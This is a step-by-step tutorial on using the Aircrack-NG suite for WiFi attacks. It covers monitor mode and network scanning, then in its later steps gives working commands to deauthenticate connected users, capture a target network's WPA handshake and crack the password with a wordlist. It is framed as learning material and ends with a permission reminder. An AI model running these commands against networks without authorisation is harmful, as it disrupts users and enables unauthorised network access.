# Aircrack-NG

The **Aircrack-NG suite** is the main set of tools for WiFi security testing. It gives you everything you need to capture WiFi traffic, grab handshakes, kick people off the network, and crack passwords.

This guide is a simple step-by-step workflow for hacking WiFi, made for learning.

---

## 📌 What's it for?

Aircrack-NG is a collection of tools used for:

*   Putting your WiFi card into "monitor mode" to see all traffic.
*   Capturing raw WiFi data (802.11 frames).
*   Scanning for nearby WiFi networks and users.
*   Forcing users off a network so they have to reconnect (deauth attack).
*   Capturing the WPA/WPA2 "handshake" needed to crack a password.
*   Getting captures ready for cracking.
*   Trying to crack the password with a wordlist.

This guide focuses on *how* it all works, not just what to type.

---

## 1. Find Your WiFi Card

Before you do anything, you need the name of your wireless card.

```bash
ip link
```

It will probably be named something like `wlan0`, `wlp2s0`, or `wlx<mac>`. You need this name for the next steps.

---

## 2. Install Aircrack-NG

Debian/Ubuntu:
```bash
sudo apt install aircrack-ng
```

Arch:
```bash
sudo pacman -S aircrack-ng
```

Kali: It's already installed.

---

## 3. Check if Your Card Can Hack

Not all WiFi cards can do monitor mode or packet injection.

Check if your card supports `monitor` mode:
```bash
iw list | grep -A 10 "Supported interface modes"
```
You should see `monitor` in the list.

---

## 4. Turn on Monitor Mode

Use `airmon-ng` to do this easily:
```bash
sudo airmon-ng start <interface-name>
```

This will usually create a new interface name, like `wlan0mon`. Use this new name from now on.

Monitor mode lets your card **see all WiFi traffic in the air**, not just the traffic meant for you.

---

## 5. Scan for WiFi Networks

Use **airodump-ng** to see all the nearby networks and who is connected to them.

```bash
sudo airodump-ng <monitor-interface-name>
```

Look for:
*   **BSSID:** The MAC address of the WiFi router.
*   **PWR:** The signal strength (higher is better).
*   **CH:** The channel the network is on.
*   **ENC:** The type of encryption (like WPA2).
*   **STATION:** Devices connected to the network.

---

## 6. Capture a WPA Handshake

Now, focus on one target network to capture the handshake.

```bash
sudo airodump-ng -c <channel> --bssid <AP_MAC_address> -w capture <monitor-interface-name>
```

When a device connects to the network, `airodump-ng` will grab the **4-way handshake**. You'll see `WPA handshake: <BSSID>` in the top right corner when it succeeds.

If nobody is connecting, you can force someone to reconnect.

---

## 7. Force a Device to Reconnect (Optional)

Use `aireplay-ng` to kick a device off the network. It will usually try to reconnect right away.

```bash
# This sends 10 deauth packets.
sudo aireplay-ng --deauth 10 -a <AP_MAC_address> <monitor-interface-name>
```
This will force devices to reconnect, letting you capture the handshake.

---

## 8. Crack the Password

Once you have the handshake (in a `capture-01.cap` file), you can try to crack it using a wordlist.

```bash
aircrack-ng -w /path/to/wordlist.txt capture-01.cap
```

This only works if the password is in your wordlist. Strong passwords can be impossible to crack.

---

## 📚 Things to Remember

*   **Monitor mode is special:** It lets your WiFi card listen to everything, like a radio scanner. Normal mode only listens for traffic meant for you.
*   **WPA2 isn't "broken":** This attack works by guessing weak passwords. It won't work on a strong, random password.
*   **Deauth attacks are easy:** The WiFi standard doesn't protect these "kick" packets, so anyone can send them.
*   **Be legal:** Only do this on networks you own or have permission to test.

---

## 🚀 Next Steps

*   **hcxdumptool** (a different way to get a hash to crack)
*   **wifite** (an automatic WiFi hacking tool)

For now, practice with Aircrack-NG. It teaches you the fundamentals of how WiFi hacking works.
